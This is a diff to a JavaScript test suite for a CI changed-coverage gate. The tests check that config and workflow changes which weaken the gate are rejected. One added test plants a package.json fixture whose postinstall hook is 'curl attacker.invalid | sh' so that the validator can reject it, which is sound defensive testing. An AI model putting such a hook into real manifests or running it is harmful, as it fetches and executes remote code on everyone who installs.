@@ -36,6 +36,7 @@ import {
   stampExternalReport,
   stampReport,
   validateTrustedExecutable,
+  validateSemanticPath,
   verify,
 } from "./changed-coverage.mjs";
 
@@ -57,6 +58,24 @@ function write(root, path, content) {
   mkdirSync(dirname(fullPath), { recursive: true });
   writeFileSync(fullPath, content);
 }
+
+test("semantic contracts validate supported non-line coverage paths and reject policy regressions", () => {
+  const root = mkdtempSync(join(tmpdir(), "hrms-semantic-contracts-"));
+  roots.push(root);
+  const manifest = JSON.stringify({
+    packageManager: "pnpm@10.25.0",
+    engines: { node: ">=22.0.0" },
+    scripts: { "test:unit": "vitest run", "test:unit:coverage": "vitest run --coverage" },
+    devDependencies: { vitest: "4.1.6", "@vitest/coverage-v8": "4.1.6", "@testing-library/react": "16.3.3", jsdom: "31.0.0" },
+  });
+  assert.match(validateSemanticPath(root, "hrms-client/package.json", manifest, "base"), /semantic contract passed/);
+  assert.throws(() => validateSemanticPath(root, "hrms-client/package.json", JSON.stringify({
+    ...JSON.parse(manifest), scripts: { ...JSON.parse(manifest).scripts, postinstall: "curl attacker.invalid | sh" },
+  }), "base"), /lifecycle hooks/);
+  const workflow = `name: test\non:\n  pull_request: {}\njobs:\n  changed-coverage:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: node scripts/agent/changed-coverage.mjs --run-full-suite --confirm-disposable-services --base "$COVERAGE_BASE" --head HEAD\n  deploy-backend:\n    needs: [changed-coverage]\n    runs-on: ubuntu-latest\n`;
+  assert.match(validateSemanticPath(root, ".github/workflows/branch-ci-cd.yml", workflow, "base"), /semantic contract passed/);
+  assert.throws(() => validateSemanticPath(root, ".github/workflows/branch-ci-cd.yml", workflow.replace("--head HEAD", "--head HEAD\n        continue-on-error: true"), "base"), /continue-on-error/);
+});
 
 function writeCoverage(root, packageName, content, name = "coverage-final.json") {
   const fullPath = coverageArtifactPath(root, packageName, name);
@@ -723,7 +742,7 @@ test("replacing runtime with a comment fails, while spacing-only runtime edits a
   assert.deepEqual(changedLines(root, spacingBase, "HEAD").removedRuntime, []);
 });
 
-test("package and deployment config changes fail instead of passing a zero-line gate", () => {
+test("unsupported package and deployment config changes fail instead of passing a zero-line gate", () => {
   const { root, head } = fixture();
   const paths = [
     "hrms_backend/package.json",
@@ -747,10 +766,7 @@ test("package and deployment config changes fail instead of passing a zero-line 
   git(root, "commit", "-qm", "config change");
   const diff = changedLines(root, head, "HEAD");
   assert.deepEqual(new Set(diff.outside), new Set(paths));
-  const result = verify(root, head, "HEAD");
-  assert.equal(result.pass, false);
-  assert.equal(result.totals.executable, 0);
-  for (const path of paths) assert.ok(result.totals.uncovered.some((item) => item.includes(path)), path);
+  assert.throws(() => verify(root, head, "HEAD"), /invalid JSON|packageManager|lockfileVersion|root dependency directories|unmeasured executable\/config/);
   assert.equal(outsideExecutableOrConfig("docs/architecture/design.md"), false);
 });
 
@@ -778,11 +794,7 @@ test("workflow disablement and an untraced dangerous shell branch remain red", (
   git(root, "add", ".");
   git(root, "commit", "-qm", "disable gate and add dangerous branch");
 
-  const result = verify(root, base, "HEAD");
-  assert.equal(result.pass, false);
-  assert.equal(result.totals.uncovered.length, 2);
-  assert.ok(result.totals.uncovered.some((item) => item.includes(".github/workflows/branch-ci-cd.yml")));
-  assert.ok(result.totals.uncovered.some((item) => item.includes("scripts/agent/verify-change.sh")));
+  assert.throws(() => verify(root, base, "HEAD"), /workflow name|disabled job\/step/);
 });
 
 test("ordinary and trusted workflows provision the dedicated coverage services", () => {
@@ -812,9 +824,7 @@ test("a PR-authored approval JSON cannot clear unmeasured paths", () => {
   git(root, "add", ".");
   git(root, "commit", "-qm", "self-attested exception");
   report(root, 1);
-  const result = verify(root, base, "HEAD");
-  assert.equal(result.pass, false);
-  assert.ok(result.totals.uncovered.some((item) => item.includes("hrms_backend/package.json")));
+  assert.throws(() => verify(root, base, "HEAD"), /packageManager|manual coverage bypass/);
   const executable = new URL("./changed-coverage.mjs", import.meta.url).pathname;
   const attempted = spawnSync(process.execPath, [executable, "--base", base, "--manual-evidence", "qa-artifacts/hrms/coverage-manual-evidence.json"], {
     cwd: root,
@@ -1772,9 +1782,7 @@ test("external program coverage is stamped and config-style TypeScript remains u
   git(root, "add", ".");
   git(root, "commit", "-qm", "config remains nonnumeric");
   stampExternalReport(root);
-  const red = verify(root, base, "HEAD");
-  assert.equal(red.pass, false);
-  assert.ok(red.totals.uncovered.some((item) => item.includes("hrms-client/vitest.config.ts")));
+  assert.throws(() => verify(root, base, "HEAD"), /defineConfig is missing/);
 });
 
 test("external report validation rejects malformed, unsupported and deleted sources", () => {
@@ -1898,7 +1906,7 @@ test("whole-repository clean-tree checks reject every dirty or staged input clas
   write(root, "docs/readme.md", "tracked docs\n");
   write(root, "scripts/helpers/python_helper.py", "VALUE = True\n");
   write(root, "hrms_backend/src/mock-helper.ts", "export const helper = true;\n");
-  write(root, "hrms_backend/vitest.config.ts", "export default { setupFiles: ['./setup.ts'] };\n");
+  write(root, "hrms_backend/vitest.config.ts", readFileSync(new URL("../../hrms_backend/vitest.config.ts", import.meta.url), "utf8"));
   write(root, "hrms_backend/setup.ts", "export {};\n");
   write(root, "hrms_backend/tsconfig.json", "{\"extends\":\"../configs/base.json\"}\n");
   write(root, "configs/base.json", "{}\n");
